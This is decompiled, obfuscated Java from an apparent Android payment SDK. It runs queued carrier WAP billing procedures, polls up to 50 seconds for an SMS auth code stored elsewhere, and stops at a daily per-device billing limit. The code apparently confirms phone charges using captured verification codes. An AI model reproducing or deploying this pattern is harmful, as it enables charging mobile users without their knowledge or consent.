package com.zhangzhifu.sdk.onlinegame;

import android.content.Context;
import com.zhangzhifu.sdk.ZhangPayCallback;
import com.zhangzhifu.sdk.ZhangPayRecodeServer;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.db.WoLianTWapDBManager;
import com.zhangzhifu.sdk.modle.WoLianTProcedure;
import com.zhangzhifu.sdk.modle.WoLianTWap;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.json.MsgResponse_wo;
import java.util.Iterator;
import java.util.List;

public class ZhangPayWOF
{
  public static int allFlow;
  private static ZhangPayWOF cF;
  public static String currentWapUrl;
  private String bA;
  private Context bZ;
  private WoLianTProcedure cG;
  private MsgResponse_wo cH;
  public String contentsid = null;
  public int count;
  public boolean isSend = false;
  public boolean isSendNext = false;
  public String smsCode = null;
  public ZhangPayCallback zhangPayCallback;
  
  public ZhangPayWOF(Context paramContext)
  {
    this.bZ = paramContext;
  }
  
  private static String A(Context paramContext)
  {
    try
    {
      if (SharePreferUtil.getInstance().getAuthCode(paramContext) != null)
      {
        if (SharePreferUtil.getInstance().getAuthCode(paramContext).equals("")) {
          return null;
        }
        if (SharePreferUtil.getInstance().getAuthCode(paramContext) != null)
        {
          paramContext = SharePreferUtil.getInstance().getAuthCode(paramContext);
          return paramContext;
        }
      }
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return null;
  }
  
  private void B(Context paramContext)
  {
    C(paramContext);
    this.smsCode = null;
    int i = 0;
    for (;;)
    {
      if (i >= 50) {
        return;
      }
      try
      {
        Thread.sleep(1000L);
        if (A(paramContext) != null)
        {
          this.smsCode = A(paramContext);
          return;
        }
      }
      catch (InterruptedException paramContext)
      {
        paramContext.printStackTrace();
        return;
      }
      i += 1;
    }
  }
  
  private static void C(Context paramContext)
  {
    SharePreferUtil.getInstance().setAuthCode(paramContext, null);
  }
  
  private static void d(Context paramContext, int paramInt)
  {
    ZhangPayRecodeServer localZhangPayRecodeServer = ZhangPayRecodeServer.getInstance();
    SharePreferUtil.getInstance();
    localZhangPayRecodeServer.sentMessServer(paramContext, SharePreferUtil.getPriciePointId(paramContext), paramInt);
  }
  
  public static ZhangPayWOF getInstance(Context paramContext)
  {
    if (cF == null) {
      cF = new ZhangPayWOF(paramContext);
    }
    return cF;
  }
  
  public void deelWoLianTWap(List paramList)
  {
    if ((paramList != null) && (paramList.size() > 0)) {
      paramList = paramList.iterator();
    }
    for (;;)
    {
      if (!paramList.hasNext()) {
        return;
      }
      WoLianTWap localWoLianTWap = (WoLianTWap)paramList.next();
      if (!JudgeTimeUtil.isMax(2, this.bZ)) {
        break;
      }
      if (localWoLianTWap == null)
      {
        ZhangPayLog.d("zhangPay_log", "计费失败");
      }
      else if ((localWoLianTWap.getAllProcedure() != null) && (localWoLianTWap.getAllProcedure().size() != 0))
      {
        new j(this, localWoLianTWap).execute(new String[] { "" });
        WoLianTWapDBManager.getInstance().delWapById(this.bZ, localWoLianTWap);
      }
    }
    SharePreferUtil.getInstance().setSmsResult(this.bZ, 1005);
    ZhangPayLog.d("zhangPay_log", "该设备今日已超过可计费次数上限");
  }
}
